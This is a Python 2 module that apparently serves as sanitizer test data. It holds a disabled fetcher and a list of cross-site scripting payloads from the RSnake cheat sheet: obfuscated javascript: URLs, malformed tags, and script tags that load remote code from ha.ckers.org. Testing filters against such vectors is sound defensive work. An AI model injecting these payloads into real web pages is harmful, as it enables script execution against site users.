import urllib2
from lxml import etree


def load_url(url):
    req = urllib2.Request(url)
    return urllib2.urlopen(req)


def xss_tests():
    raise Exception('disabled')
    attacks_url = 'http://ha.ckers.org/xssAttacks.xml'
    doc = etree.parse(load_url(attacks_url))
    for attack in doc.iter("attack"):
        name = attack.find("name").text
        code = attack.find("code").text
        desc = attack.find("desc").text
        label = attack.find("label").text
        browser = attack.find("browser").text
        yield code


xss_exploits = [
"""
';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83\
))//";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,\
83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
""",
"""
'';!--"<XSS>=&{()}
""",
"""
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
""",
"""
<IMG SRC="javascript:alert('XSS');">
""",
"""
<IMG SRC=javascript:alert('XSS')>
""",
"""
<IMG SRC=JaVaScRiPt:alert('XSS')>
""",
"""
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
""",
"""
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
""",
'''
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
''',
"""
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
""",
"""
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;\
&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
""",
"""
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114\
&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114\
&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
""",
"""
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C\
&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
""",
"""
<IMG SRC="jav\tascript:alert('XSS');">
""",
"""
<IMG SRC="jav&#x09;ascript:alert('XSS');">
""",
"""
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
""",
"""
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
""",
"""
<IMG
SRC
=
"
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
"
>
""",
"""
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
""",
"""
<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
""",
"""
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
""",
"""
<<SCRIPT>alert("XSS");//<</SCRIPT>
""",
"""
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
""",
"""
<SCRIPT SRC=//ha.ckers.org/.j>
""",
"""
<IMG SRC="javascript:alert('XSS')"
""",
"""
<iframe src=http://ha.ckers.org/scriptlet.html <
""",
"""
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
"""
    ]
